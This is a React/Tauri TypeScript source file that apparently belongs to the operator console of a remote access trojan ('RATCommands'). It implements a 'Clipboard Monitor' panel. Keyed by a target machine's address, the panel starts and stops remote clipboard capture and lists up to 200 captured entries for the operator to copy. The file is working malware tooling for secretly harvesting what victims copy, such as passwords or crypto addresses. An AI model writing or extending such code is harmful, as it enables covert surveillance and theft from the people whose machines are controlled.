import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import {
  startClipboardMonitorCmd,
  stopClipboardMonitorCmd,
} from "../rat/RATCommands";
import { ClipboardUpdatePayload } from "../../types";
import { IconClipboard, IconCopy, IconTrash } from "@tabler/icons-react";

export const Clipboard: React.FC = () => {
  const { addr } = useParams();
  const [clipboardHistory, setClipboardHistory] = useState<string[]>([]);
  const [running, setRunning] = useState(false);
  const [status, setStatus] = useState("Ready");

  useEffect(() => {
    let unlisten: (() => void) | null = null;

    const setupListener = async () => {
      unlisten = await listen("clipboard_update", (event) => {
        const payload = event.payload as ClipboardUpdatePayload;
        if (payload.addr !== addr) return;
        setClipboardHistory((prev) => [payload.data.text, ...prev].slice(0, 200));
      });
    };

    setupListener();

    return () => {
      unlisten?.();
    };
  }, [addr]);

  const toggleMonitor = async () => {
    if (!addr) return;
    try {
      if (running) {
        await stopClipboardMonitorCmd(addr);
        setRunning(false);
        setStatus("Monitoring stopped");
      } else {
        await startClipboardMonitorCmd(addr);
        setRunning(true);
        setStatus("Monitoring started");
      }
    } catch (e) {
      console.error(e);
      setStatus("Failed to toggle monitoring");
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setStatus("Copied to clipboard");
    setTimeout(() => setStatus("Ready"), 2000);
  };

  const clearHistory = () => {
    setClipboardHistory([]);
    setStatus("History cleared");
  };

  return (
    <div className="flex flex-col h-screen bg-[#050505] text-gray-200 overflow-hidden font-sans">
      <div className="h-16 shrink-0 bg-[#0a0a0a] border-b border-[#1a1a1a] flex items-center justify-between px-6 shadow-xl z-20">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-accentx/10 rounded-xl border border-accentx/20">
            <IconClipboard className="text-accentx" size={24} />
          </div>
          <div>
            <h1 className="text-lg font-black tracking-tighter uppercase italic text-white">
              Clipboard Monitor
            </h1>
            <p className="text-[10px] font-mono text-gray-500 uppercase tracking-widest leading-none">
              Live clipboard capture and history
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="text-xs uppercase tracking-[0.3em] text-gray-500">
            {status}
          </span>
          <button
            onClick={clearHistory}
            className="rounded-xl bg-[#111] px-4 py-2 text-xs text-white hover:bg-[#222] transition flex items-center gap-2"
          >
            <IconTrash size={14} /> Clear
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden">
        <div className="w-64 shrink-0 bg-[#080808] border-r border-[#1a1a1a] p-4 space-y-4">
          <button
            onClick={toggleMonitor}
            className={`flex items-center gap-2 w-full rounded-2xl px-4 py-3 text-sm font-bold uppercase tracking-tight transition ${
              running ? "bg-green-700" : "bg-[#111] hover:bg-[#1a1a1a]"
            }`}
          >
            <IconClipboard size={18} /> {running ? "Stop Monitor" : "Start Monitor"}
          </button>

          <div className="rounded-2xl bg-[#0f0f0f] border border-[#1a1a1a] p-4">
            <div className="flex items-center justify-between text-xs uppercase tracking-[0.3em] text-gray-500 mb-3">
              <span>Stats</span>
            </div>
            <div className="space-y-2 text-[11px] text-gray-300">
              <div>Events: {clipboardHistory.length}</div>
              <div>Status: {running ? "Active" : "Idle"}</div>
            </div>
          </div>
        </div>

        <div className="flex-1 p-6 overflow-y-auto bg-[#050505]">
          <div className="space-y-3">
            {clipboardHistory.length === 0 ? (
              <p className="text-sm text-gray-500">No clipboard events captured yet.</p>
            ) : (
              clipboardHistory.map((text, index) => (
                <div
                  key={index}
                  className="rounded-2xl border border-[#1a1a1a] p-4 bg-[#111] group hover:border-[#2a2a2a] transition"
                >
                  <div className="flex items-start justify-between gap-4">
                    <pre className="text-xs text-gray-300 whitespace-pre-wrap break-all flex-1 font-mono">
                      {text}
                    </pre>
                    <button
                      onClick={() => copyToClipboard(text)}
                      className="shrink-0 rounded-lg bg-[#1a1a1a] p-2 text-gray-400 hover:text-white hover:bg-[#2a2a2a] transition opacity-0 group-hover:opacity-100"
                      title="Copy to clipboard"
                    >
                      <IconCopy size={14} />
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
